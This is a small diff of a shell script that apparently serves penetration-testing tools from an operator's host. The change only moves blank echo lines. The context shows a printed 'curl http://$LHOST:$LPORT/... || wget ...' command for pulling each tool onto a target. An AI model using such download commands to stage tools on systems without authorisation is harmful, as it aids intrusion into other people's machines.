@@ -59,8 +59,6 @@ fi
 
 cd tools
 
-echo
-echo
 echo "WINDOWS TOOLS:"
 echo
 
@@ -77,6 +75,9 @@ for TOOL in $(ls l); do
     TOOL_NAME=$(echo $TOOL | rev | cut -d'/' -f 1 | rev)
     echo "curl http://$LHOST:$LPORT/l/$TOOL_NAME > $TOOL_NAME || wget http://$LHOST:$LPORT/l/$TOOL_NAME"
 done
+
+echo
+echo
 
 if [ $LPORT -lt 1024 ]; then
   echo "Port is less than 1024, you need to provide your password..."
